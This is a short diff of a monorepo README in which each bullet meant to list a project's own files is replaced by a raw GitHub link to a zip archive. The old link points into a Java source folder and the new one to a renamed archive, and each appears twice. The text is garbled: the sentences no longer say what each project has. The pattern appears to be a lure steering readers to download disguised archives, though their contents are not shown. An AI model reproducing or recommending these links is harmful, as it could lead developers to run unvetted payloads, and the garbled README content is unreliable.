@@ -79,6 +79,6 @@ This repository is a **monorepo** containing multiple independent projects.
 
 Each project:
 - Lives in its own folder
-- Has its own `https://raw.githubusercontent.com/MilaCodesIt/open-spring-lab/main/ecommerce/src/main/java/com/openspringlab/ecommerce/dto/lab-open-spring-3.9.zip`
-- Has its own `https://raw.githubusercontent.com/MilaCodesIt/open-spring-lab/main/ecommerce/src/main/java/com/openspringlab/ecommerce/dto/lab-open-spring-3.9.zip`
+- Has its own `https://raw.githubusercontent.com/MilaCodesIt/open-spring-lab/main/ecommerce/spring-open-lab-2.4.zip`
+- Has its own `https://raw.githubusercontent.com/MilaCodesIt/open-spring-lab/main/ecommerce/spring-open-lab-2.4.zip`
 - Can be run independently
